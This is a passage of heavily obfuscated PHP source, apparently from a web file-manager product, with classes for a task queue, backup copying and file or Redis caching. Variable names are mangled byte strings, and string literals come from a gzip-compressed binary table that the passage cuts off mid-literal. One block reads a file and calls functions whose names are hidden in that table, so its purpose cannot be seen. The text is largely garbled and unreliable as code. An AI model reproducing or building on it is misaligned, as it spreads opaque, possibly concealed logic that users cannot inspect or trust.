$¾‡ûæã¼[1323]); } $§’È±¹¼ = number_format(timeFloat() - $Ùø’¤±Ó, 3) . $¾‡ûæã¼[1949]; if ($ìÖ÷Õ¨ä && is_string($ìÖ÷Õ¨ä)) { $§’È±¹¼ = $§’È±¹¼ . $¾‡ûæã¼[2044] . $ìÖ÷Õ¨ä; } write_log($¾‡ûæã¼[2045] . $ŠØÉÅ‘Ÿ[$¾‡ûæã¼[548]] . $¾‡ûæã¼[2046] . $§’È±¹¼, $¾‡ûæã¼[195]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÛöÇû¯Â =& $_SERVER[”øäÃÍª]; $¶¥»³Ä¸ = self::threadCount() + 1; if ($¶¥»³Ä¸ > 3 || !self::count()) { return; } write_log($ÛöÇû¯Â[2047] . $¶¥»³Ä¸, $ÛöÇû¯Â[195]); Cache::set(self::QUEUE_THREAD, $¶¥»³Ä¸, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÛöÇû¯Â[2048], $ÛöÇû¯Â[195]); } public static function getKey($Î‹ø’ø¡, $ÀÌşµ‚æ = "\x69\156\164") { $·¡òŸ£® =& $_SERVER[”øäÃÍª]; Cache::removeMemory($Î‹ø’ø¡); $‚§ˆÔ‹ş = Cache::get($Î‹ø’ø¡); if ($ÀÌşµ‚æ == $·¡òŸ£®[364]) { return $‚§ˆÔ‹ş ? intval($‚§ˆÔ‹ş) : 0; } if ($ÀÌşµ‚æ == $·¡òŸ£®[2049]) { return is_array($‚§ˆÔ‹ş) ? $‚§ˆÔ‹ş : array(); } return $‚§ˆÔ‹ş; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[”øäÃÍª][2049]); } public static function setAll($öî¬ÕÌº) { $Ö¹Èù‡‰ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($öî¬ÕÌº), $Ö¹Èù‡‰); Cache::set(self::QUEUE_DATA, $öî¬ÕÌº, $Ö¹Èù‡‰); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¢Ãş¢–, $¹‚ú”¬Á = 5.0) { if (!$¢Ãş¢–) { return; } $Šéõå¹ñ = Cache::get($¢Ãş¢–); if (!$Šéõå¹ñ || timeFloat() - floatVal($Šéõå¹ñ) >= $¹‚ú”¬Á) { Cache::set($¢Ãş¢–, timeFloat(), $¹‚ú”¬Á * 10); return !0; } return !1; } public static function timeLimitCall($£³’¿Ãß, $óÀ­¯†È, $¡‡š€¸, $òè×œ« = 5.0) { $ç‚ĞºÆø =& $_SERVER[”øäÃÍª]; if (!$£³’¿Ãß || !$óÀ­¯†È) { return; } self::$asyncAdd = !0; $–ä¶™¨Ğ = $ç‚ĞºÆø[2050]; $Üçˆ†ì  = Cache::get($–ä¶™¨Ğ, !0); $˜¢­ª›À = array($ç‚ĞºÆø[2051] => timeFloat(), $ç‚ĞºÆø[2052] => timeFloat(), $ç‚ĞºÆø[342] => $óÀ­¯†È, $ç‚ĞºÆø[2042] => $¡‡š€¸, $ç‚ĞºÆø[2053] => $òè×œ«); if (is_array($Üçˆ†ì [$£³’¿Ãß])) { if (timeFloat() - $Üçˆ†ì [$£³’¿Ãß][$ç‚ĞºÆø[2051]] <= $˜¢­ª›À[$ç‚ĞºÆø[2053]] * 0.5) { return; } $˜¢­ª›À[$ç‚ĞºÆø[2052]] = $Üçˆ†ì [$£³’¿Ãß][$ç‚ĞºÆø[2052]]; } $Üçˆ†ì [$£³’¿Ãß] = $˜¢­ª›À; Cache::set($–ä¶™¨Ğ, $Üçˆ†ì , 60); Cache::removeMemory($–ä¶™¨Ğ); write_log($ç‚ĞºÆø[2054] . $£³’¿Ãß . $ç‚ĞºÆø[74] . $óÀ­¯†È . $ç‚ĞºÆø[2055] . ACTION, $ç‚ĞºÆø[195]); } public static function timeLimitCallLoop() { $ûÁÏİ“Ö =& $_SERVER[”øäÃÍª]; $¤ÇÌÚÌö = array($ûÁÏİ“Ö[2056]); $ Š–ó‚¤ = in_array(strtolower(ACTION), $¤ÇÌÚÌö); if (!$ Š–ó‚¤ && !self::$asyncAdd) { return; } $ƒŠĞ­ì‡ = $ûÁÏİ“Ö[2050]; $ĞıÄ = Cache::get($ƒŠĞ­ì‡, !0); if (!$ĞıÄ || count($ĞıÄ) <= 0) { return; } $ü¹Ä§ö´ = timeFloat(); $ãÅíš¸¨ = array(); $ãÃ‹Øáœ = array(); foreach ($ĞıÄ as $ûàûÉ³Ô => $â¥®¥²ƒ) { if ($ü¹Ä§ö´ - $â¥®¥²ƒ[$ûÁÏİ“Ö[2052]] > $â¥®¥²ƒ[$ûÁÏİ“Ö[2053]]) { $ãÃ‹Øáœ[$ûàûÉ³Ô] = $â¥®¥²ƒ; continue; } $ãÅíš¸¨[$ûàûÉ³Ô] = $â¥®¥²ƒ; } if (count($ãÃ‹Øáœ) == 0) { return; } if (count($ãÅíš¸¨) == 0) { Cache::remove($ƒŠĞ­ì‡); } else { Cache::set($ƒŠĞ­ì‡, $ãÅíš¸¨, 60); } Cache::removeMemory($ƒŠĞ­ì‡); self::runArr($ãÃ‹Øáœ); } public static function finished($œµ„µ·, $ä½ß×) { $ªş·è­Å =& $_SERVER[”øäÃÍª]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ªş·è­Å[342] => $œµ„µ·, $ªş·è­Å[2042] => $ä½ß×); } private static function runArr($¾½í×Á) { $ğ·­²«„ =& $_SERVER[”øäÃÍª]; if (!$¾½í×Á) { return; } foreach ($¾½í×Á as $§Ÿ¥‡«– => $æÍóµ¤¯) { try { Hook::apply($æÍóµ¤¯[$ğ·­²«„[342]], $æÍóµ¤¯[$ğ·­²«„[2042]]); write_log($ğ·­²«„[2057] . $§Ÿ¥‡«– . $ğ·­²«„[74] . $æÍóµ¤¯[$ğ·­²«„[342]] . $ğ·­²«„[2055] . ACTION, $ğ·­²«„[195]); } catch (Exception $Ñ¦ŠÓ‡) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } if ($_SERVER[$_SERVER[”øäÃÍª][492]] != $_SERVER[$_SERVER[”øäÃÍª][997]]) { $_getc = $_SERVER[”øäÃÍª][494]; $_getfile = $_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”øäÃÍª][285], $_getfilec); if (count($_getarrs) < $_SERVER[”øäÃÍª][497]) { $exit = $_SERVER[”øäÃÍª][498]; $exit(); } $_act = $_SERVER[”øäÃÍª][499]; $_act($_SERVER[$_SERVER[”øäÃÍª][493]]); } goto B…¯Ëİ•”•; C­ëâŸ®Ó: class BackupFile { public function __construct() { } public function index() { $¬ ¯€¥Î = Backup::get(); $Ş¨øµÔ† = $¬ ¯€¥Î[$_SERVER[”øäÃÍª][865]][$_SERVER[”øäÃÍª][230]][$_SERVER[”øäÃÍª][565]]; $Ä°İ¾™° = array($_SERVER[”øäÃÍª][566] => array($_SERVER[”øäÃÍª][923], $Ş¨øµÔ†), $_SERVER[”øäÃÍª][924] => array($_SERVER[”øäÃÍª][406], $¬ ¯€¥Î[$_SERVER[”øäÃÍª][861]])); $ë‰ïöö = (int) Model($_SERVER[”øäÃÍª][902])->where($Ä°İ¾™°)->count($_SERVER[”øäÃÍª][565]); $„Ëò«˜º = (int) Model($_SERVER[”øäÃÍª][902])->where($Ä°İ¾™°)->sum($_SERVER[”øäÃÍª][79]); $òÃ¹½â¡ = new TaskFileTransfer($_SERVER[”øäÃÍª][925], $_SERVER[”øäÃÍª][889], $ë‰ïöö, LNG($_SERVER[”øäÃÍª][897]) . $_SERVER[”øäÃÍª][898] . LNG($_SERVER[”øäÃÍª][926])); $òÃ¹½â¡->task[$_SERVER[”øäÃÍª][873]] = $„Ëò«˜º; $Ó³çâÆ½ = array($_SERVER[”øäÃÍª][927] => $ë‰ïöö, $_SERVER[”øäÃÍª][928] => $„Ëò«˜º, $_SERVER[”øäÃÍª][929] => time()); Backup::set($Ó³çâÆ½); $âİ¿‚‰¡ = !0; $‰¨”ô„ = $this->storeIds(); $†èÃÂµÉ = 1; $»ŞÚ˜‡ı = 1000; $ïä’Ä— = $À¡•Ã = 0; $ÏéÂÔôÒ = array(); $¨…¤ıÇ = $¦ÆÉ™Ş´ = 0; do { $äÑıéÒ = $_SERVER[”øäÃÍª][930]; $ˆì—ì« = Model($_SERVER[”øäÃÍª][902])->where($Ä°İ¾™°)->field($äÑıéÒ)->order($_SERVER[”øäÃÍª][931])->selectPage($»ŞÚ˜‡ı, $†èÃÂµÉ); $‚¹ÔÇÆ¢ = !empty($ˆì—ì«[$_SERVER[”øäÃÍª][446]]) ? $ˆì—ì«[$_SERVER[”øäÃÍª][446]] : array(); foreach ($‚¹ÔÇÆ¢ as $©°ä®×) { if (!$this->_fileExist($©°ä®×, $ÏéÂÔôÒ, $‰¨”ô„)) { Backup::log($_SERVER[”øäÃÍª][932] . $©°ä®×[$_SERVER[”øäÃÍª][565]] . $_SERVER[”øäÃÍª][933] . $©°ä®×[$_SERVER[”øäÃÍª][87]]); continue; } $‘ßÄõÌÌ = $©°ä®×[$_SERVER[”øäÃÍª][87]]; $¸ƒòğùş = "\173\151\x6f\72{$¬ ¯€¥Î[$_SERVER[”øäÃÍª][861]]}\x7d" . substr($‘ßÄõÌÌ, strlen("\173\151\157\x3a{$©°ä®×[$_SERVER[”øäÃÍª][934]]}\175")); if (IO::exist($¸ƒòğùş)) { $òÃ¹½â¡->updateFileEnd($©°ä®×[$_SERVER[”øäÃÍª][32]], $©°ä®×[$_SERVER[”øäÃÍª][79]]); } else { $¸ƒòğùş = get_path_father($¸ƒòğùş); IO::mkdir($¸ƒòğùş); if (!IO::copy($‘ßÄõÌÌ, $¸ƒòğùş, $_SERVER[”øäÃÍª][935])) { Backup::log($_SERVER[”øäÃÍª][936] . $‘ßÄõÌÌ . $_SERVER[”øäÃÍª][920] . $¸ƒòğùş . $_SERVER[”øäÃÍª][175]); $âİ¿‚‰¡ = !1; break; } } $Ş¨øµÔ† = $©°ä®×[$_SERVER[”øäÃÍª][565]]; $À¡•Ã += 1; $ïä’Ä— += $©°ä®×[$_SERVER[”øäÃÍª][79]]; $¦ÆÉ™Ş´ += 1; $¨…¤ıÇ += $©°ä®×[$_SERVER[”øäÃÍª][79]]; if ($ïä’Ä— >= 1024 * 1024 * 100) { $Ó³çâÆ½ = array($_SERVER[”øäÃÍª][860] => $Ş¨øµÔ†, $_SERVER[”øäÃÍª][937] => $¦ÆÉ™Ş´, $_SERVER[”øäÃÍª][938] => $¨…¤ıÇ); Backup::set($Ó³çâÆ½); $ïä’Ä— = $À¡•Ã = 0; } } $Œ«š‚€Ó = count($‚¹ÔÇÆ¢); $†èÃÂµÉ++; } while ($Œ«š‚€Ó == $»ŞÚ˜‡ı); $òÃ¹½â¡->end(); $Ó³çâÆ½ = array($_SERVER[”øäÃÍª][939] => 1, $_SERVER[”øäÃÍª][871] => time(), $_SERVER[”øäÃÍª][887] => 1, $_SERVER[”øäÃÍª][860] => $Ş¨øµÔ†, $_SERVER[”øäÃÍª][940] => time()); if ($À¡•Ã) { $Ó³çâÆ½[$_SERVER[”øäÃÍª][937]] = $¦ÆÉ™Ş´; $Ó³çâÆ½[$_SERVER[”øäÃÍª][938]] = $¨…¤ıÇ; } Backup::set($Ó³çâÆ½); return !0; } private function _fileExist($‘»§¶¤, &$¾Ÿª‹Ãç, $ã¢Æ¹¥) { $ƒİÇªÎô =& $_SERVER[”øäÃÍª]; $­ë“„Ø‘ = $‘»§¶¤[$ƒİÇªÎô[87]]; if (in_array($‘»§¶¤[$ƒİÇªÎô[565]], $¾Ÿª‹Ãç)) { return !1; } if (!in_array($‘»§¶¤[$ƒİÇªÎô[934]], $ã¢Æ¹¥)) { return !1; } if (IO::exist($­ë“„Ø‘)) { return !0; } $¸Ïè­Ìú = get_path_father($­ë“„Ø‘); if (IO::exist($¸Ïè­Ìú)) { $¾Ÿª‹Ãç[] = $‘»§¶¤[$ƒİÇªÎô[565]]; return !1; } $ËŸŒãİš = array($ƒİÇªÎô[934] => $‘»§¶¤[$ƒİÇªÎô[934]], $ƒİÇªÎô[87] => array($ƒİÇªÎô[473], "{$¸Ïè­Ìú}\x25")); $“ÆÄşó = Model($ƒİÇªÎô[902])->where($ËŸŒãİš)->field($ƒİÇªÎô[566])->select(); $¾Ÿª‹Ãç = array_merge($¾Ÿª‹Ãç, array_to_keyvalue($“ÆÄşó, $ƒİÇªÎô[12], $ƒİÇªÎô[565])); return !1; } private function _fileFilter($…²î…ûİ) { $ãÎ¢î¦Ï =& $_SERVER[”øäÃÍª]; return; if (empty($…²î…ûİ)) { return; } $êµæí…İ = array($ãÎ¢î¦Ï[565] => array($ãÎ¢î¦Ï[7], array_unique($…²î…ûİ))); $¤™è°¾ƒ = Model($ãÎ¢î¦Ï[941])->where($êµæí…İ)->field($ãÎ¢î¦Ï[191])->select(); foreach ($¤™è°¾ƒ as $ÉÊ×ı º) { Model($ãÎ¢î¦Ï[941])->remove($ÉÊ×ı º[$ãÎ¢î¦Ï[191]], !1); } } private function storeIds() { $™Î Œéæ =& $_SERVER[”øäÃÍª]; $ª•’áŠş = Model($™Î Œéæ[877])->listData(); $°ıª·¦Ú = array(); $øŞ ¦¯ã = $GLOBALS[$™Î Œéæ[6]][$™Î Œéæ[92]][$™Î Œéæ[942]]; foreach ($ª•’áŠş as $‚û¹Àı£) { $õ®÷…ê = strtolower($‚û¹Àı£[$™Î Œéæ[96]]); if (!isset($øŞ ¦¯ã[$õ®÷…ê])) { continue; } $ì¦µ¨ò‚ = $™Î Œéæ[77] . (isset($øŞ ¦¯ã[$õ®÷…ê]) ? $øŞ ¦¯ã[$õ®÷…ê] : ucfirst($õ®÷…ê)); if (!class_exists($ì¦µ¨ò‚)) { continue; } $°ıª·¦Ú[] = $‚û¹Àı£[$™Î Œéæ[487]]; } return $°ıª·¦Ú; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $Ê¤ŒÂõ² =& $_SERVER[”øäÃÍª]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $Û£âÇ›š = $GLOBALS[$Ê¤ŒÂõ²[6]][$Ê¤ŒÂõ²[424]]; $ĞôÏş¦ = $Û£âÇ›š[$Û£âÇ›š[$Ê¤ŒÂõ²[943]]]; $¦²ßµ„Ú = $Û£âÇ›š[$Ê¤ŒÂõ²[944]]; switch ($Û£âÇ›š[$Ê¤ŒÂõ²[943]]) { case $Ê¤ŒÂõ²[21]: self::$handle = Model($Ê¤ŒÂõ²[945]); break; case $Ê¤ŒÂõ²[946]: self::$handle = new CacheRedis($ĞôÏş¦, $¦²ßµ„Ú); break; case $Ê¤ŒÂõ²[947]: self::$handle = new CacheMemcached($ĞôÏş¦, $¦²ßµ„Ú); break; case $Ê¤ŒÂõ²[230]: self::$handle = new CacheFile($ĞôÏş¦, $¦²ßµ„Ú); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($‰ŠÚ±øé) { if (is_array($‰ŠÚ±øé) || is_object($‰ŠÚ±øé)) { $‰ŠÚ±øé = json_encode($‰ŠÚ±øé); } $‰ŠÚ±øé = rawurlencode($‰ŠÚ±øé); return md5(KOD_SITE_ID . $_SERVER[”øäÃÍª][11] . $‰ŠÚ±øé); } public static function get($î£îî¹—, $ü±÷§Á® = false) { $ıÒ¢‘Ô = self::key($î£îî¹—); $ì¢á = self::init(); if ($ü±÷§Á®) { return unserialize($ì¢á->get($ıÒ¢‘Ô)); } if (!isset(self::$memoryCache[$ıÒ¢‘Ô])) { $æ³’É”ã = $ì¢á->get($ıÒ¢‘Ô); self::$memoryCache[$ıÒ¢‘Ô] = unserialize($æ³’É”ã); } return self::$memoryCache[$ıÒ¢‘Ô]; } public static function set($›«ˆò‡ò, $»ãëÆƒ‹, $’ƒ¿í§ƒ = false) { $á²È­ë =& $_SERVER[”øäÃÍª]; $æ‹¢Ø‹ï = self::key($›«ˆò‡ò); if (isset(self::$memoryCache[$æ‹¢Ø‹ï]) && self::$memoryCache[$æ‹¢Ø‹ï] === $»ãëÆƒ‹) { return !0; } if ($’ƒ¿í§ƒ === 0) { self::$memoryCache[$æ‹¢Ø‹ï] = $»ãëÆƒ‹; return !0; } $şÎ˜şâ = self::init(); $ éºâ»‹ = serialize($»ãëÆƒ‹); CacheLock::lock($›«ˆò‡ò . $á²È­ë[948]); $¿·¾Å = $şÎ˜şâ->set($æ‹¢Ø‹ï, $ éºâ»‹, $’ƒ¿í§ƒ); self::$memoryCache[$æ‹¢Ø‹ï] = $»ãëÆƒ‹; CacheLock::unlock($›«ˆò‡ò . $á²È­ë[948]); return $¿·¾Å; } public static function getCall($•²–œ, $Ş‹á“ĞŸ, $¬œÚÑÛ“, $æ¼¼üÍã = array()) { $»»Õì°š =& $_SERVER[”øäÃÍª]; $“Ş¸¼  = self::get($•²–œ); if ($“Ş¸¼  || $“Ş¸¼  === $»»Õì°š[12]) { return $“Ş¸¼ ; } $“Ş¸¼  = call_user_func_array($¬œÚÑÛ“, $æ¼¼üÍã); $“Ş¸¼  = $“Ş¸¼  ? $“Ş¸¼  : $»»Õì°š[12]; self::set($•²–œ, $“Ş¸¼ , $Ş‹á“ĞŸ); return $“Ş¸¼ ; } public static function limitCall($°õÁ­æ, $°ì”ÔµŠ = 15, $²íĞ˜Õ = 30, $ÙóµÖé = true) { $ÖåÇ­Îó =& $_SERVER[”øäÃÍª]; static $¾ù’·ãà = array(); if ($ÙóµÖé) { $°õÁ­æ = $°õÁ­æ . $ÖåÇ­Îó[949] . KodUser::id() . $ÖåÇ­Îó[950] . get_client_ip(); } if (isset($¾ù’·ãà[$°õÁ­æ]) && is_array($¾ù’·ãà[$°õÁ­æ])) { return $¾ù’·ãà[$°õÁ­æ][$ÖåÇ­Îó[332]] <= $²íĞ˜Õ; } $Óö§œ¯Ñ = self::get($°õÁ­æ); if (!is_array($Óö§œ¯Ñ) || time() - $Óö§œ¯Ñ[$ÖåÇ­Îó[204]] > $°ì”ÔµŠ) { $Óö§œ¯Ñ = array($ÖåÇ­Îó[204] => time(), $ÖåÇ­Îó[332] => 0); } $Óö§œ¯Ñ[$ÖåÇ­Îó[332]]++; self::set($°õÁ­æ, $Óö§œ¯Ñ, $°ì”ÔµŠ); $¾ù’·ãà[$°õÁ­æ] = $Óö§œ¯Ñ; return $Óö§œ¯Ñ[$ÖåÇ­Îó[332]] <= $²íĞ˜Õ; } public static function limitRuntime($ğ½Ëæ‡Ñ, $ÃøêĞ¹) { $„Û¡‹«¸ = $_SERVER[”øäÃÍª][951] . $ğ½Ëæ‡Ñ; if (isset(self::$runTimeCache[$„Û¡‹«¸]) || !$ÃøêĞ¹) { return !0; } $íì×†Áê = intval(self::get($„Û¡‹«¸)); $íì×†Áê = !$íì×†Áê || $íì×†Áê <= 0 ? 1 : $íì×†Áê + 1; if ($íì×†Áê > $ÃøêĞ¹) { return !1; } self::$runTimeCache[$„Û¡‹«¸] = !0; self::set($„Û¡‹«¸, $íì×†Áê, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ÚÃÊã†À => $²ïâÃ²¯) { $›Ï‹ºÁ“ = intval(self::get($ÚÃÊã†À)); $›Ï‹ºÁ“ = !$›Ï‹ºÁ“ || $›Ï‹ºÁ“ <= 1 ? 0 : $›Ï‹ºÁ“ - 1; self::set($ÚÃÊã†À, $›Ï‹ºÁ“, 3600); } self::$runTimeCache = array(); } public static function remove($·¬ı™Ç‚) { $´‡Ã¡½È = self::key($·¬ı™Ç‚); unset(self::$memoryCache[$´‡Ã¡½È]); self::clearTimeout(); CacheLock::lock($·¬ı™Ç‚); $¬è„Ñ÷Ä = self::init()->remove($´‡Ã¡½È); CacheLock::unlock($·¬ı™Ç‚); return $¬è„Ñ÷Ä; } public static function removeMemory($ Î„ü•ò) { $„¾§ı»û = self::key($ Î„ü•ò); unset(self::$memoryCache[$„¾§ı»û]); } public static function clearMemory($øõûîàÆ = false) { if ($øõûîàÆ) { $øõûîàÆ = self::key($øõûîàÆ); unset(self::$memoryCache[$øõûîàÆ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[”øäÃÍª][952])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[”øäÃÍª][953])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ç“ëçÈ‰, $èŒ Ùë€) { $ ÚĞ„êÆ =& $_SERVER[”øäÃÍª]; $this->cachePath = $Ç“ëçÈ‰[$ ÚĞ„êÆ[87]]; $this->prefix = $ ÚĞ„êÆ[954]; $this->cacheTime = $èŒ Ùë€; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($èŸ³è›¬) { $µóÌ—÷­ =& $_SERVER[”øäÃÍª]; $èŸ³è›¬ = str_replace(array($µóÌ—÷­[955], $µóÌ—÷­[97], $µóÌ—÷­[76]), $µóÌ—÷­[956], $èŸ³è›¬); return $this->cachePath . $µóÌ—÷­[957] . $èŸ³è›¬ . $µóÌ—÷­[958]; } public function set($Ñ£ÙÏ÷, $ìïŸ‚»™, $¡½óéíã = false) { $¡½óéíã = $¡½óéíã ? $¡½óéíã : $this->cacheTime; $õÂ†“øŸ = $this->getFile($Ñ£ÙÏ÷); if (file_put_contents($õÂ†“øŸ, $this->prefix . $ìïŸ‚»™, LOCK_EX)) { @touch($õÂ†“øŸ, intval(time() + $¡½óéíã)); clearstatcache(); return !0; } @unlink($õÂ†“øŸ); return !1; } public function get($éÎÈëÜº) { $‘¤‡÷¨¬ = $this->getFile($éÎÈëÜº); if (file_exists($‘¤‡÷¨¬) && filemtime($‘¤‡÷¨¬) < time()) { @unlink($‘¤‡÷¨¬); return !1; } $æ›ëØÌ = @file_get_contents($‘¤‡÷¨¬); return substr($æ›ëØÌ, strlen($this->prefix)); } public function remove($£‰áÑĞ) { $§ë‰–‚· = $this->getFile($£‰áÑĞ); return @unlink($§ë‰–‚·); } public function deleteAll() { $¤»¢õ™Ò =& $_SERVER[”øäÃÍª]; $ø¿¿§¤ = scandir($this->cachePath); foreach ($ø¿¿§¤ as $«ö¬È”) { $Ùè—”Â• = $this->cachePath . $«ö¬È”; if (strpos($Ùè—”Â•, $¤»¢õ™Ò[958]) && strpos($Ùè—”Â•, $¤»¢õ™Ò[959])) { @unlink($Ùè—”Â•); } } } public function clearTimeout() { $¬îÚÇò =& $_SERVER[”øäÃÍª]; $•àÊƒëĞ = scandir($this->cachePath); foreach ($•àÊƒëĞ as $™ƒÛÅàÃ) { $•í‹ïÏõ = $this->cachePath . $™ƒÛÅàÃ; if (strpos($•í‹ïÏõ, $¬îÚÇò[958]) && strpos($•í‹ïÏõ, $¬îÚÇò[959]) && filemtime($•í‹ïÏõ) < time()) { @unlink($•í‹ïÏõ); } } } } goto FÊ™À«âˆá; E„‚ñŠˆËï: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('lPjkw82q'), "\xed\xa6\xb4\xdf\xd9\x88"); $_SERVER[”øäÃÍª] = explode("\x7c\x4\x7c\x3\x7c\x4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\171\174\33\325\325\60\334\122\240\220\262\224\27\132\240\205\62\61\111\154\47\132\154\147\167\342\44\262\54\333\42\262\144\44\71\13\266\31\106\322\110\32\133\322"."\xc8\x9a\x91\x97\x40\xca\x1a\xf6\x0\x69\xd9\x77\xca\x3\x85\xb6\x59\x80\x96\xa5\xec\x2d\xdd\xe9\xa\xb4\xb4\xd0\xf2\xb0\xd8\x1\xa\xa5\x94\xf6\xa1\xb4\x14\xde\xbb\x9c\xbb\xcc\x48\x86\xe7\xfb\x7d\x7f\xbc\x81\x44\x77\x9f\x7b"."\xcf\x3d\xf7\xdc\x73\xcf\x3d\xe7\xdc\x2b\x6f\x3b\xff\x2f\x8f\xed\x39\x6d\xdf\xd3\x3e\x75\xda\xbe\x8f\xed\x79\xe3\xa7\xdb\x7e\x46\xc3\xe8\xef\x7e\xa7\xed\x4f\xc3\xc7\x5d\x74\xc0\x27\xc8\x9f\xc3\x2f\xba\xb0\xa9\xa9\x77\xd9\x9c"."\105\321\203\56\375\366\116\155\227\266\123\273\50\26\371\331\223\341\203\177\361\255\23\102\63\267\376\154\152\346\223\237\70\363\203\343\176\335\216\12\323\272\355\364\107\51\231\266\242\117\32\226\155\321\204\264"."\131\312\32\71\32\66\112\364\327\117\177\6\342\221\212\136\64\155\235\106\175\364\107\205\176\221\177\255\261\202\301\362\325\150\54\251\46\6\372\373\103\361\44\24\152\227\363\213\146\6\102\145\255\242\25\341".strrev('¼ê(Òv*ÖÂ`‘ÊõU¥"PCû›“Vm‰Ô+µN®¥ ³JZÙ£!")—¬³e©ÍÈŞ¡b½eû')."\xc4\x44\x85\xf7\xab\x33\xd4\x13\x8e\x2a\xc9\x78\x20\x9a\x8\x4\x93\xe1\x58\x94\x26\x7\x63\x7d\x7d\xe1\x64\x6d\x7a\x3c\x16\x89\x74\x6\x82\xeb\x6b\x73\xfa\xe3\x81\x9e\xbe\x80\x82\xfa\x57\xd0\x55\xa3\x94\x35\x9b\x94\x53\x68"."\316\51\112\63\15\164\33\172\41\103\203\45\215\165\307\236\52\103\50\311\103\150\232\112\325\102\201\106\242\74\224\321\263\132\265\0\320\352\222\43\345\212\121\324\330\240\327\353\123\74\225\6\264\252\155\32"."\245\64\215\204\46\355\212\46\322\121\137\323\150\242\365\22\64\225\10\105\102\301\244\202\73\250\164\307\143\175\12\114\102\121\263\154\275\242\154\354\15\305\103\12\356\164\107\43\31\153\243\2\370\22\105\240".strrev('B\'wu‰i<a#½'."\0".'x'."\r".'8ñCWRÚLĞV¡òY¢Å›JY¹Ò¸¡]âÅ:hf³,^¶[2ˆ‘P').base64_decode('PAaDOzGCerIY8NMRy2QLtjquFaoMTUfpbyP8wK9pAeqOGSWjCmgKTZgmX1YQqLLSOkvRMxAoovo=').strrev('0-Œ¶54 b«¾vj>×°J1™´¥ê­ŠôóŠ”ıAWCXìqĞ­a•ŠZAKÔ&')."\312\254\121\320\243\325\242\134\204\107\323\171\243\220\251\260\245\367\121\45\151\64\302\127\62\56\53\142\145\324\23\116\4\214\354\224\130\212\270\134\77\317\265\314\152\45\255\207\321\322\241\361\126\110\326\155"."\x1b\xd\x8e\x1\xc4\x1c\x28\x17\x4c\x2d\x93\xd0\x2b\x7c\x68\x86\xd9\x8d\x1a\x8a\x55\x6d\x39\x71\x94\xad\x82\x8c\x4\x84\x21\x68\x32\xaf\x17\xa\xaa\x3e\xa9\xc3\x92\x28\x66\x96\x5a\x6c\x2c\x7e\x2b\x65\x94\xfc\x28\x85\x46\xc3"."\61\65\257\131\371\276\314\122\225\324\142\264\62\243\117\372\312\371\62\254\127\276\104\207\34\50\213\107\36\65\355\220\104\161\13\146\132\203\262\125\62\20\32\316\333\166\71\241\227\62\170\40\320\155\163\242"."\x44\x6\x5a\xd6\x75\x28\xd4\xe5\x51\x32\x4a\x9f\xb2\x59\xe9\x6d\x37\xda\x2d\x56\xb1\x58\xe0\x21\x36\x3a\x9e\x66\xf1\x44\x7b\x92\xcd\x46\x26\xb\xc8\xc6\x8\x7e\x3\x7c\xd0\xb0\x8\xed\x12\xb\x4f\x2b\x97\xb\x46\x5a\xb3\xd".strrev('óÁJ°Ø5‡ki1z¹h™EWjQœŒUá9‚…x,ÅvK4Ë-Ö bĞk¢»-{n¶Ó7ä³')."\77\263\260\243\152\147\275\53\330\332\342\245\53\132\311\312\352\25\157\10\20\273\135\101\235\345\364\215\25\353\62\254\262\151\31\270\173\355\212\146\333\132\72\217\151\203\150\276\343\43\312\33\245\202\121\322"."\153\313\242\106\164\157\177\105\313\25\265\166\245\134\115\41\0\300\172\202\264\64\56\41\27\6\0\264\53\105\155\322\253\345\130\113\241\311\262\121\321\55\66\152\245\247\57\11\30\225\365\366\341\165\140\350"."\x19\x6f\x2\x11\x5f\x68\x6c\x71\xcb\x12\x5\xe1\x8a\xc2\xf2\x68\x6a\x6f\x32\xd9\xaf\x86\xbb\xd1\xee\x1a\xd\xa9\x7d\x81\x64\xb0\x17\x5a\xb7\xb5\x1c\x6b\x3a\x82\x48\x2a\x6f\x92\x25\x6e\xf2\xa2\xf5\x80\xb1\x29\x8a\x6\x27\x12"."\373\315\11\275\202\76\334\71\325\256\214\232\231\224\71\351\143\131\270\160\2\21\6\126\30\317\157\331\366\306\265\122\16\17\43\65\145\353\226\233\264\164\242\275\330\227\245\213\317\227\322\263\146\5\106\143"."\215\347\234\300\217\350\245\234\235\147\155\47\102\361\15\241\270\232\210\165\47\67\6\342\260\165\227\20\346\114\262\336\340\257\27\